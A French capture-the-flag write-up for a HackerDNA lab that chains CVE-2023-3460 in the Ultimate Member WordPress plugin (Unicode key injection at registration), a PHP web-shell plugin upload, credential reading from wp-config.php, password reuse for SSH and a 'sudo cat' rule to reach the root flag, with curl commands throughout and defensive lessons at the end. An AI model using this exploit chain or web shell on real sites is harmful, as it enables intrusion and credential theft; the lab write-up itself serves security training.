# Compte rendu : WP Ultimate

Plateforme : HackerDNA (https://hackerdna.com/labs/wp-ultimate)
Auteur : SRH
Difficulté : Difficile
Tags : WordPress, Ultimate Member, CVE-2023-3460, Unicode Injection, Mass Assignment, Plugin Upload, RCE, Password Reuse, Sudo Cat, Privilege Escalation
XP : +700 XP

## Scénario
Un hôte WordPress expose le plugin Ultimate Member 2.6.6, vulnérable à une élévation de privilèges par injection de clés Unicode lors de l'inscription. L'objectif est de devenir administrateur, d'installer un plugin PHP malveillant pour obtenir une exécution de code, de réutiliser le mot de passe de la base de données pour un accès Unix, puis de lire le flag root via une règle sudo mal configurée.

Prérequis : fondamentaux des applications web, ligne de commande Linux, compréhension de PHP, familiarité avec les concepts de CMS.

## Chaîne d'Attaque
[Reconnaissance WordPress] → [Injection Unicode (CVE-2023-3460)] → [Accès admin] → [Plugin malveillant] → [RCE] → [Flag user] → [Mot de passe base de données] → [SSH] → [Sudo cat] → [Flag root] → 🚩

## Étape 1 — Reconnaissance WordPress
Le site cible est un WordPress. On commence par une énumération avec WPScan pour identifier la version du CMS, les plugins installés et les utilisateurs.

wpscan --url http://<IP>/ --enumerate vp,vt,u

Le plugin Ultimate Member 2.6.6 est identifié. Cette version est vulnérable à la CVE-2023-3460, une élévation de privilèges permettant à un utilisateur de s'inscrire avec des capabilities élevées (administrateur) en utilisant des clés Unicode qui contournent les filtres du plugin.

## Étape 2 — Injection Unicode lors de l'inscription
La page d'inscription d'Ultimate Member est accessible sur /register/ ou /?page_id=12. Le formulaire contient un nonce CSRF et les champs user_login, user_email, user_password.

On récupère le nonce, puis on envoie la requête d'inscription en injectant wp_càpabilities[administrator]=1 (le à accentué contourne le filtre du plugin).

# Récupération du nonce
NONCE=$(curl -s -H "Host: blog.nexatech.hdna" "http://<IP>/?page_id=12" | grep -oE 'name="_wpnonce" value="[^"]+"' | cut -d'"' -f4)

# Inscription avec la capability admin
curl -s -i -X POST -H "Host: blog.nexatech.hdna" "http://<IP>/?page_id=12" \
  -d "user_login-6=pwnadmin" \
  -d "user_email-6=pwn@evil.com" \
  -d "user_password-6=<PASSWORD>" \
  -d "confirm_user_password-6=<PASSWORD>" \
  -d "form_id=6" \
  -d "_wpnonce=$NONCE" \
  --data-urlencode "wp_càpabilities[administrator]=1"

Après l'inscription, le compte pwnadmin possède les droits administrateur.

## Étape 3 — Connexion admin et installation d'un plugin malveillant
On se connecte à /wp-admin avec le compte créé. Une fois admin, on installe un plugin ZIP contenant un web shell PHP.

# Création du plugin
mkdir -p evil
echo '<?php /* Plugin Name: Evil */ ?>' > evil/evil.php
echo '<?php system($_GET["c"]); ?>' > evil/shell.php
cd evil && zip -r ../evil.zip . && cd ..

# Upload du plugin (avec nonce CSRF)
curl -s -b admin_cookies.txt -H "Host: blog.nexatech.hdna" \
  -F "pluginzip=@evil.zip" \
  -F "_wpnonce=<NONCE_UPLOAD>" \
  -F "install-plugin-submit=Install Now" \
  "http://<IP>/wp-admin/update.php?action=upload-plugin"

On active le plugin, puis on teste l'exécution de commandes :

curl -s -H "Host: blog.nexatech.hdna" "http://<IP>/wp-content/plugins/evil/shell.php?c=id"
# → uid=33(www-data)

## Étape 4 — Flag utilisateur et identifiants de la base
On lit le flag utilisateur et les identifiants de la base de données depuis wp-config.php.

curl -s -H "Host: blog.nexatech.hdna" "http://<IP>/wp-content/plugins/evil/shell.php?c=cat%20/home/*/flag-user.txt"
curl -s -H "Host: blog.nexatech.hdna" "http://<IP>/wp-content/plugins/evil/shell.php?c=cat%20/var/www/html/wp-config.php"

Le mot de passe de la base de données est récupéré. Il est souvent réutilisé pour un compte Unix.

Flag User : <USER_FLAG>

## Étape 5 — Connexion SSH et flag root via sudo cat
On se connecte en SSH avec les identifiants trouvés (le mot de passe de la base est réutilisé pour un compte système, par exemple nexatech).

ssh <USER>@<IP>

Une fois connecté, on vérifie les droits sudo :

sudo -l
# → (ALL) /bin/cat

On utilise sudo cat pour lire le flag root :

sudo cat /root/flag-root.txt

Flag Root : <ROOT_FLAG>

## Conclusion
Ce lab illustre une chaîne d'exploitation complète : une vulnérabilité dans le plugin Ultimate Member (CVE-2023-3460) permet de devenir administrateur via une injection Unicode, l'installation d'un plugin malveillant donne une RCE, le mot de passe de la base de données est réutilisé pour un accès SSH, et une règle sudo mal configurée (cat en sudo) permet de lire le flag root.

## Leçons Apprises
1. Maintenir les plugins WordPress à jour : Ultimate Member 2.6.6 est vulnérable à une élévation de privilèges critique.
2. Ne jamais réutiliser le mot de passe de la base de données pour des comptes système Unix.
3. Auditer les règles sudo : autoriser cat en sudo permet de lire n'importe quel fichier, y compris /root/flag-root.txt.
4. Restreindre l'installation de plugins aux seuls administrateurs de confiance.
5. Surveiller les tentatives d'inscription avec des clés Unicode suspectes.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
